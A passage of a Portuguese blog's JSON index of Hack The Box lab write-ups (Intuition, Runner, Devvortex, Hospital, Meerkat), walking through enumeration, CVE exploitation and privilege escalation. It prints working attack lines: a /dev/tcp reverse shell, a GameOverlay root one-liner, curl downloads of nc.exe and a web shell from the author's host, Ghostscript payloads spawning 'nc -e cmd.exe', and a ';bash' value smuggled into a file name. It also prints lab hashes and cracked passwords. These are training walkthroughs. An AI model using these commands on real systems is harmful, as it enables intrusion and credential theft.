flagUtilizei o CVE-2023-2255 que explora uma vulnerabilidade no LibreOffice para dar permissões a maya de administrador local.https://github.com/elweth-sec/CVE-2023-2255?tab=readme-ov-filepython3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'Utilizando o crackmapexec que permite executar comandos remotos diretamente ao sistema operacional.Utilizando o –sam, o crackmapexec fará um dump no banco de dados SAM. Esse banco armazena credenciais dos usuários em um sistema windows.crackmapexec smb 10.10.11.14 -u maya -p \"m4y4ngs4ri\" --samUtilizando a hash que o crackmapexec forneceu, é possível acessar via impacket-wmiexec.impacket-wmiexec localadmin@10.10.11.14 -hashes aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefaeDessa forma, é possível conseguir a root flag."
  },
  
  {
    "title": "HTB Máquinas - Intuition",
    "url": "/posts/HTB-Intuition/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-05-01 03:30:12 -0300",
    





    
    "snippet": "IntuitionDe antemão, peço desculpas por não fazer um post mais detalhado. Estou terminando as demandas da faculdade e estou correndo contra o relógio. Mas qualquer dúvida vocẽs podem entrar em cont...",
    "content": "IntuitionDe antemão, peço desculpas por não fazer um post mais detalhado. Estou terminando as demandas da faculdade e estou correndo contra o relógio. Mas qualquer dúvida vocẽs podem entrar em contato comigo!EnumeraçãoNmap:nmap -A -sV -sC 10.10.11.15                                                Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 06:37 -03Nmap scan report for 10.10.11.15Host is up (0.34s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://comprezzor.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 53.23 seconds┌──(yoshiro㉿kali)-[~]└─$ gobuster dns -d comprezzor.htb -w subdomains-top1million-20000.txt-comprezzor.htb-report.comprezzor.htb-auth.comprezzor.htb-dashboard.comprezzor.htbVulnerabilidadeIndo até report.comprezzor.htb, faça uma conta e realize o seguinte XSS.Dessa forma, será possível receber os cookies da página.Com os cookies, acesse dashboard.comprezzor.htb, e com os mesmos cookies, envie outro relatório com outro XSS e, assim que um administrador entrar para ver o relátorio, é possível roubar os cookies do adm.A página de PDF é sucetivel ao ataque SSRF. UsuárioPara descobrir em qual usuário devemos logar no ssh, usaremos o seguinte comando:RootDatabase usando SQLite.Apenas consegui quebrar a senha do Adam.Faça o login do FTP e faça o download dos seguintes arquivos:ftp adam@127.0.0.1get runner1get runner1.cget run-tests.shCom esses arquivos, é possível encontrar a AUTH_KEY_PREFIX e KNOWN_MD5_HASH. Com um script simples é possível o código de autorização.import hashlibimport itertoolsimport stringAUTH_KEY_PREFIX = \"UHI75GHI\"KNOWN_MD5_HASH = \"0feda17076d793c2ef2870d7427ad4ed\"CHARSET = string.ascii_letters + string.digitsKEY_LENGTH = 4def check_auth_key(suffix):    key = f\"{AUTH_KEY_PREFIX}{suffix}\"    return hashlib.md5(key.encode()).hexdigest() == KNOWN_MD5_HASHfor guess in itertools.product(CHARSET, repeat=KEY_LENGTH):    if check_auth_key(''.join(guess)):        print(f\"Found auth key: {AUTH_KEY_PREFIX}{''.join(guess)}\")        breakelse:    print(\"Auth key not found.\")┌──(yoshiro㉿kali)-[~/htb]└─$ python3 auth.py                                 Found auth key: UHI75GHINKOPAdam não tem as permissões necessárias para as executar ações relacionadas ao sys-admin, por isso, será necessário escolonar para o usuário Lopez.Procurando no log, foi possível encontrar a pasta suricata. Utilizando o grep é possível identificar o login do Lopez.Com acesso a esse usuário, é possível acessar o runner2.Com algumas tentativas é erros, é possível identificar o comando que precisa ter utilizado.Para o acesso root, faça um download de algum sys-admin com meta/main.yml, por exemplo: https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz.Após isso:curl -O http://10.10.14.42:8080/sys-admins-role-0.0.3.tar.gzmv sys-admins-role-0.0.3.tar.gz sys-admins-role.tar\\;bashecho '{\"run\": { \"action\": \"install\",\"role_file\":\"sys-admins-role.tar;bash\"}, \"auth_code\": \"UHI75GHINKOP\"}' &gt; yoshi.jsonsudo /opt/runner2/runner2 yoshi.jsonVocê é root."
  },
  
  {
    "title": "HTB Máquinas - Runner",
    "url": "/posts/HTB-Runner/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-04-23 07:30:12 -0300",
    





    
    "snippet": "RunnerEnumeraçãoNmap:──(yoshiro㉿kali)-[~/htb/runner]└─$ nmap 10.10.11.13 -A -sV -sCStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 13:48 -03Nmap scan report for runner.htb (10.10.11.13)Hos...",
    "content": "RunnerEnumeraçãoNmap:──(yoshiro㉿kali)-[~/htb/runner]└─$ nmap 10.10.11.13 -A -sV -sCStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 13:48 -03Nmap scan report for runner.htb (10.10.11.13)Host is up (0.34s latency).Not shown: 997 closed tcp ports (conn-refused)PORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp   open  http        nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Runner - CI/CD Specialists8000/tcp open  nagios-nsca Nagios NSCA|_http-title: Site doesn't have a title (text/plain; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 74.03 secondsJogando o IP no navegador, somos direcionados para um site que apresenta desenvolvedores especialiados em CI/CD. Esse site em sí, não oferece oportunidades para um ataque, então procurei por subdomínios. Utilizei uma wordlist própria em que contém palavras chaves relacionadas ao desenvolvimento CI/CD e, junto com o vhost, foi possível encontrar o dominio teamcity.runner.htb.Abaixo do login, é possível identificar a versão do TeamCity, sendo a  Version 2023.05.3 (build 129390). Pesquisando sobre, essa versão é vulneránel ao CVE-2023-42793.Explorando a vulnerabilidadeUtilizando o script, é possível gerar um login para acesso a plataforma.Após acessar, é possível identificar que a plataforma possuí backups, e nesses backups, é possível identificar uma chave de acesso.Também é possível identificar alguns usuários na plataforma do TeamCity, levando a considerar que a chave de acesso é referente ao usuário matthew ou John.User FlagConsegui acesso ao usuário John pelo SSh e consegui a flag user.Verificando mais afundo, é possível identificar que existe outro domínio sobre o sistema, o portainer-administration.runner.htb.Procurando por mais informações nos arquivos de backup, é possível encontrar informações sobre as senhas criptografadas dos usuários do sistema.Utilizando o hashcat, é possível descriptografar a senha do matthew.Root flagUtilizando as credenciais do matthew, é possível acessar a plataforma de dockers do runners.htb.Vamos criar um container para que seja possível realizar comandos via command bash. Primeiramente, criaremos um volume com as seguinte configurações:Depois, iremos criar um container com as seguintes configurações:Depois disso, iremos iniciar o container e iniciar um command bash e conseguir o acesso root."
  },
  
  {
    "title": "HTB Sherlocks - Meerkat",
    "url": "/posts/HTB-Meerkat/",
    "categories": "HTB, Sherlocks",
    "tags": "sherlocks, htb",
    "date": "2024-04-18 03:47:12 -0300",
    





    
    "snippet": "MeerkatTask 1Acreditamos que o servidor da nossa Plataforma de Gestão Empresarial foi comprometido. Você pode confirmar o nome do aplicativo em execução?Antes de tudo, é possível observar que o hos...",
    "content": "MeerkatTask 1Acreditamos que o servidor da nossa Plataforma de Gestão Empresarial foi comprometido. Você pode confirmar o nome do aplicativo em execução?Antes de tudo, é possível observar que o host local é o 172.31.6.44 e que, está recebendo muito tráfego vindo dos IP’s 54.144.148.213, 156.146.62.213, 138.199.59.221 e 95.181.232.30.Aplicando um filtro de tcp para a porta 8080 e para o host local e foi possível perceber que o aplicativo em execução é o BonitaSoft por conta das solicitações GET e POST que foram apresentadas.R: BonitaSoftTask 2Acreditamos que o invasor pode ter usado um subconjunto da categoria de ataque de força bruta – qual é o nome do ataque realizado?Análisando as solicitações POST que foram realizadas no host, é possível perceber que o atacante está utilizando um método de força bruta baseado em injeção de credenciais.R: Credential StuffingTask 3A vulnerabilidade explorada possui um CVE atribuído? Se sim, qual?Analisando o JSON é possível identificar que o atacante utilizou o CVE-2022-25237 para tentar conseguir acesso a aplicação com uma exploit provido do bonitasoft.R: CVE-2022-25237Task 4Qual string foi anexada ao caminho do URL da API para ignorar o filtro de autorização da exploração do invasor?Lendo sobre a vulnerabilidadae CVE-2022-25237, é possível identificar que ela funciona adicionando “i18ntranslation” em uma das duas variações da URL.R: i18ntranslationTask 5Quantas combinações de nomes de usuário e senhas foram usadas no ataque de preenchimento de credenciais?Apliquei o filtro http.request.method == “POST” e analisei quantas requisições únicas foram feitas.R: 56Task 6Qual combinação de nome de usuário e senha foi bem-sucedida?Análisando a última requisição do filtro aplicado anteriormente, foi possível identificar o usuário e senha.R: seb.broom@forela.co.uk:g0vernm3ntTask 7Se houver, qual site de compartilhamento de texto o invasor utilizou?Análisando o pacote 3652 com o método GET, foi possível identificar que o atacante utilizou o pastes.io.R: pastes.ioTask 8Forneça o nome do arquivo da chave pública usada pelo invasor para obter persistência em nosso host.Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo é hffgra4unv.R: hffgra4unvTask 9Você pode confirmar o arquivo modificado pelo invasor para ganhar persistência?Análisandoo script Análisando o script em que o atacante fez o upload em https://pastebin.ai/raw/bx5gcr0et8, é possível identificar que o nome do arquivo modificado pelo atacante é /home/ubuntu/.ssh/authorized_keys.R: /home/ubuntu/.ssh/authorized_keysTask 10Você pode confirmar o ID da técnica MITRE deste tipo de mecanismo de persistência?Anaĺisando a Matrix do MITRE ATT&amp;CK, identifiquei um TTP que corresponde às ações do invasor: Chaves autorizadas SSH (T1098.004) em Manipulação de conta na coluna Persistência.R: T1098.004"
  },
  
  {
    "title": "HTB Máquinas - Devvortex",
    "url": "/posts/HTB-Devvortex/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-04-11 09:33:12 -0300",
    





    
    "snippet": "DevvortexEnumeraçãoPrimeiramente, iremos iniciar com o NMAP que é uma ferramenta desenvolvida para realizar varreduras de portas e mapear dispositivos conectados a uma rede, o Nmap é uma poderosa u...",
    "content": "DevvortexEnumeraçãoPrimeiramente, iremos iniciar com o NMAP que é uma ferramenta desenvolvida para realizar varreduras de portas e mapear dispositivos conectados a uma rede, o Nmap é uma poderosa utilidade de linha de comando que fornece informações detalhadas sobre hosts, serviços e sistemas operacionais em uma rede. Seus recursos incluem detecção de dispositivos, varredura de portas, identificação de serviços em execução, detecção de firewalls e análise de vulnerabilidades. Nessa situação, usei uma varredura simples para verificar quais portas estavam abertas.Após a varredura é possível encontrar as portas 80 e 22 abertas.A porta 80 é geralmente reservada para comunicações HTTP, que é o protocolo usado para transferência de informações na internet.A porta 22 está associada ao protocolo SSH, que é utilizado para acessar e gerenciar remotamente sistemas Unix-like. O SSH fornece uma conexão segura e criptografada, sendo amplamente utilizado para administração remota de servidores. Por meio de uma conexão SSH, os usuários podem executar comandos no terminal de um sistema remoto de forma segura, transferir arquivos e realizar outras operações.Usando o endereço ip 10.10.11.242 somos direcionados para http://devvortex.htb. Um site bem estruturado e que possuí um forms de contato sem nenhuma aplicação útil.Utilizei o gobuster nessa página, que é uma ferramenta utilizada para realizar ataques de força bruta em servidores web, buscando por recursos ocultos ou não autorizados. Seu principal propósito é ajudar na enumeração de diretórios e arquivos em um site, mas nesse caso, não foi encontrado nenhuma pista para qualquer avanço.Então decidi procurar por mais domínios atrelados ao devvortex.htb usando o dnsmap. Ao realizar consultas ao DNS, o DNSMap tenta encontrar subdomínios que podem representar possíveis pontos de entrada para ataques ou fornecer informações valiosas sobre a infraestrutura de um alvo.Encontrei outro domínio sendo o http://dev.devvortex.htb.Utilizando o gobuster nessa página foi possível encontrar uma página de administrador.Indo até http://dev.devvortex.htb/administrator/ foi possível encontrar página de login do “Joomla!”.O Joomla é usado como CMS, ele ajuda principalmente para gestão de conteúdo de páginas oferecendo ferramentas para criar, publicar e gerir conteúdos online. Vamos verificar qual versão está sendo rodada usando o JoomScan para procurar por vulnerabilidades.Descobrimos então, que a versão que o Devvortex está rodando é a 4.2.6.Explorando a vulnerabilidadePesquisando, encontrei a vulnerabilidade CVE-2023-23752, um exploit que explora versões abaixo da 4.2.8. Então, provavelmente, esse sistema será afetado por esse exploit.O exploit está disponível em:https://github.com/Acceis/exploit-CVE-2023-23752Mais informações em: https://nvd.nist.gov/vuln/detail/CVE-2023-23752Utilizando o exploit, conseguimos informações de login no sistema. E com essas informações, conseguimos adentrar no Joomla.Dentro do sistema, conseguimos o direito de edição dos templates. Seguindo o caminho System &gt; Templates &gt; Administrator Templates, encontrei algumas páginas php disponíveis dentro de um template.Implementei um código para que, assim que essa página fosse chamada pelo navegador, a linha seria lida e um shell reverso feito.O netcat é uma ferramenta utilizada para interação de rede, oferecendo funcionalidades versáteis de leitura e escrita de dados em sockets. O Netcat é muitas vezes referido como a “canivete suíço para TCP/IP” devido à sua flexibilidade e capacidade de desempenhar diversas funções e iremos utilizar dessa ferramenta para realizar um shell reverso.Assim que eu visitei http://dev.devvortex.htb/administrator/templates/atum/login.php, o meu netcat foi ativado, conseguindo assim acesso ao shell.Escalonando para usuárioVerificando o sistema de dentro, foi póssivel identificar o usuário logan novamente, pois antes haviamos encontrado ele no scan em que fizemos utilizando o JoomScan. E como ele está registrado no Joomla, é bem provável que a sua senha esteja no banco de dados do sistema.Antes de tentar acessar o banco de dados, é necessário iniciar um pseudo terminal de utilidades com python. É necessário pois precisamos iniciar uma interface para rodar os comandos do banco de dados.Pesquisando no banco de dados, é possível encontrar a tabela com os usuários do sistema, e abrindo ela, é possível identificar hashs de senhas. Vamos pegar a hash do usuário logan e quebrar utilizando o john the ripper para que possamos efetuar o login no ssh.Após essas etapas, é possível acessar o ssh com a senha que foi quebrada e conseguir a userflag.Escalonando para rootUtilizei “sudo -l” para listar os privilégios de sudo que o usuário logan possuí. Identifiquei quais operações estão autorizadas para ele, assim, proporcionando uma visão clara dos privilégios disponíveis e possíveis brechas para escalonar o privilegio como root. Com acesso a essas informações, consegui detectar a versão disponível no apport-cli.O Apport é um sistema de coleta e relatório de erros que ajuda os desenvolvedores e mantenedores do sistema a identificar e corrigir problemas em aplicativos e componentes do sistema. Isso é útil quando um usuário encontra um problema ou falha em um aplicativo e deseja fornecer informações detalhadas sobre o erro para ajudar no processo de correção. O relatório pode incluir informações sobre o sistema, logs relevantes e outros detalhes que podem ser úteis para diagnosticar e corrigir o problema.Essa versão do apport-cli possível uma vulnerabilidade em que vamos carregar e visualizar os crash reports usando o apport-cli. O sistema linux possuí esses crash no /var/crash, utilizando o seguinte comando:Após começar a carregar, digite V e a página de crash irá carregar. Dessa forma, poderemos digitar !sh conseguindo acesso root e a flag root."
  },
  
  {
    "title": "HTB Máquinas - Hospital",
    "url": "/posts/HTB-Hospital/",
    "categories": "HTB, Máquinas",
    "tags": "máquinas, htb",
    "date": "2024-04-11 08:47:12 -0300",
    





    
    "snippet": "HospitalEnumeraçãoComo sempre, iremos iniciar o pentesting usando o NMAP para verificar quais portas a aplicação usa. Irei verificar primeiramente com um comando simples.nmap 10.10.11.241 Starting ...",
    "content": "HospitalEnumeraçãoComo sempre, iremos iniciar o pentesting usando o NMAP para verificar quais portas a aplicação usa. Irei verificar primeiramente com um comando simples.nmap 10.10.11.241 Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-14 18:02 -03Nmap scan report for 10.10.11.241Host is up (0.13s latency).Not shown: 980 filtered tcp ports (no-response)PORT     STATE SERVICE22/tcp   open  ssh53/tcp   open  domain88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap443/tcp  open  https445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl1801/tcp open  msmq2103/tcp open  zephyr-clt2105/tcp open  eklogin2107/tcp open  msmq-mgmt2179/tcp open  vmrdp3268/tcp open  globalcatLDAP3269/tcp open  globalcatLDAPssl3389/tcp open  ms-wbt-server8080/tcp open  http-proxyMuitos serviços são hospedados nesse endereço. Vou começar pela porta 8080 e 443 já que essas portas estão hospedando os serviços https e http-proxy. Ao acessar o endereços 10.10.11.241:8080 e 10.10.11.241:443, somos direcionados a duas telas de login.Fazendo um usuário em 10.10.11.241:8080 é possível identificar uma página de upload de arquivos. Ou seja, possívelmente esse sistema seja vulnerável a algum arquivo infectado.Antes de mais nada, vamos verificar quais diretórios temos disponíveis nessa aplicação.gobuster dir -u http://10.10.11.241:8080 -w /home/kali/Documents/imp/wordlist/big.txt  ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.11.241:8080[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /home/kali/Documents/imp/wordlist/big.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.htaccess            (Status: 403) [Size: 279]/.htpasswd            (Status: 403) [Size: 279]/css                  (Status: 301) [Size: 317] [--&gt; http://10.10.11.241:8080/css/]/fonts                (Status: 301) [Size: 319] [--&gt; http://10.10.11.241:8080/fonts/]/images               (Status: 301) [Size: 320] [--&gt; http://10.10.11.241:8080/images/]/js                   (Status: 301) [Size: 316] [--&gt; http://10.10.11.241:8080/js/]/l                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/l/]/m                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/m/]/server-status        (Status: 403) [Size: 279]/u                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/u/]/uploads              (Status: 301) [Size: 321] [--&gt; http://10.10.11.241:8080/uploads/]/vendor               (Status: 301) [Size: 320] [--&gt; http://10.10.11.241:8080/vendor/]/w                    (Status: 301) [Size: 315] [--&gt; http://10.10.11.241:8080/w/]Progress: 20476 / 20477 (100.00%)===============================================================Finished===============================================================Com a existência do diretório /uploads, poderemos utiliza-lo como gatilho para o Powny Shell. Você pode verificar mais informações em https://github.com/flozz/p0wny-shell/blob/master/shell.php.Exploração da vulnerabilidadeEm primeiro caso, o sistema não estava aceitando enviar o Shell por ele estar em formato .php. Mas com uma simples alteração de formato para .phar, foi possível enviar o shell.Após enviar o shell, podemos acessar pelo seguinte link: 10.10.11.241:8080/uploads/shell.phar.Com o Shell feito, é possível iniciar o Shell reverso para um melhor desempenho.www-data@webserver:…/html/uploads# /usr/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.159/4444 0&gt;&amp;1'nc -lvpn 4444 listening on [any] 4444 ...10.10.11.241: inverse host lookup failed: Unknown hostconnect to [10.10.14.159] from (UNKNOWN) [10.10.11.241] 6608bash: cannot set terminal process group (952): Inappropriate ioctl for devicebash: no job control in this shellwww-data@webserver:/var/www/html/uploads$ Identifiquei a versão do servidor, sendo ela a Ubuntu 23.04.www-data@webserver:/var/www/html/uploads$ cat /etc/os-releasecat /etc/os-releasePRETTY_NAME=\"Ubuntu 23.04\"NAME=\"Ubuntu\"VERSION_ID=\"23.04\"VERSION=\"23.04 (Lunar Lobster)\"VERSION_CODENAME=lunarID=ubuntuID_LIKE=debianHOME_URL=\"https://www.ubuntu.com/\"SUPPORT_URL=\"https://help.ubuntu.com/\"BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"UBUNTU_CODENAME=lunarLOGO=ubuntu-logoCom essas informação em mãos, encontrei as vulnerabilidades CVE-2023-2640 e CVE-2023-32629É possível verificar mais informações sobre em:https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629Para conseguirmos acesso como root, executaremos o seguinte comando:unshare -rm sh -c \"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;\" &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(\"cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash\")'Agora iremos encontrar os usuários ativos do sistema usando cat /etc/passwd, e como resultados encontramos o usuário:drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bashUtilizando o comando cat /etc/shadow, é possível encontrar a hash de da senha do drwilliams.drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::Utilizando o hashcat, iremos quebrar a hash.hashcat hash.txt rockyou.txtO resultado foi:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#Com isso, será possível acessar o endereço 10.10.11.241:443 com o usuário do drwilliams.Esse sistema é referente a envios de e-mails. Caso o sistema não tenha sido desenvolvido corretamente, uma das formas de explorar vulnerabilidades nesses sistemas é utilizando GhostScript em arquivos .eps.Para explorar essa vulnerabilidade iremos utilizar um código injetável referente ao CVE-2023-36664.Primeiramente, iremos inicar um servidor http para que o nosso alvo faça o download do netcat.exe, da seguinte forma:python -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)...Após isso, iremos realizar o nosso primeiro payload de um aquivo .eps solicitando para que o servidor baixe do nosso servidor o nc.exe.python3 CVE_2023_36664_exploit.py --inject --payload \"curl 10.10.14.159:8000/nc.exe -o nc.exe\" --filename file.epsApós isso, enviaremos esse arquivo file.eps como anexo a um e-mail ao Drbrown. (Favor, relevar o bug dos icones, isso não deveria ter acontecido :DD)Após isso, vamos configurar o nc.exe que enviamos anteriormente com o endereço e porta da nossa máquina e enviaremos novamente esse arquivo em anexo.python3 CVE_2023_36664_exploit.py --inject --payload \"nc.exe 10.10.14.159 4444 -e cmd.exe\" --filename file.epsApós isso, iremos realizar um novo arquivo inserindo o chamado ao nosso shell reverso.python3 CVE_2023_36664_exploit.py --inject --payload \"nc.exe 10.10.14.159 4444 -e nc.exe\" --filename file.epsAntes de enviar o próximo e-mail, inicie o seu netcat.nc -lvnp 4444listening on [any] 4444 ...Após enviar o e-mail, nosso shell reverso estará pronto.nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.159] from (UNKNOWN) [10.10.11.241] 6124Microsoft Windows [Version 10.0.17763.4974](c) 2018 Microsoft Corporation. All rights reserved.C:\\Users\\drbrown.HOSPITAL\\Documents&gt;User FlagPara encontrar a user flag, basta navegar até o Desktop do drbrown.C:\\Users\\drbrown.HOSPITAL&gt;cd DesktopC:\\Users\\drbrown.HOSPITAL\\Desktop&gt;type user.txttype user.txt7f785f1abc*******fbc61fd9502c6c9cRoot FlagProcurando pelo ghostscript, foi possível descobrir a senha do Rpcclient.C:\\Users\\drbrown.HOSPITAL\\Documents&gt;type ghostscript.battype ghostscript.bat@echo offset filename=%~1powershell -command \"$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c \"C:\\Program` Files\\gs\\gs10.01.1\\bin\\gswin64c.exe\" -dNOSAFER \"C:\\Users\\drbrown.HOSPITAL\\Downloads\\%filename%\" }\"Após verificar Rpccliente, identifiquei que as informações de administrador é compartilhada com as de guest.rpcclient $&gt; querydispinfoindex: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH\tName: (null)\tDesc: (null)index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator\tName: Administrator\tDesc: Built-in account for administering the computer/domainindex: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown\tName: Chris Brown\tDesc: (null)index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams\tName: Lucy Williams\tDesc: (null)index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domainindex: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt\tName: (null)\tDesc: Key Distribution Center Service Accountindex: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a\tName: Microsoft Exchange Approval Assistant\tDesc: (null)index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a\tName: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}\tDesc: (null)index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8\tName: Microsoft Exchange\tDesc: (null)index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb\tName: E4E Encryption Store - Active\tDesc: (null)index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68\tName: Microsoft Exchange Federation Mailbox\tDesc: (null)index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309\tName: Microsoft Exchange\tDesc: (null)index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea\tName: Discovery Search Mailbox\tDesc: (null)index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db\tName: Microsoft Exchange\tDesc: (null)index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98\tName: Microsoft Exchange Migration\tDesc: (null)Nessa ocasião, podemos enviar o shell como convidado e acessar como administrador.No diretório C:\\xampp\\htdocs&gt;, envie o P0wny Shell.curl http://10.10.14.159:8080/shell.phar -o shell.phpApós isso, acesse https://10.10.11.241/shell.php e você poderá acessar como administrador e encontrar a flag root.Com isso, chegamos ao final de mais uma máquina! Lembre-se, todo o processo é bastate árduo e tentei ao máximo realizar de maneira didática! Até a próxima!"
  }
  
]

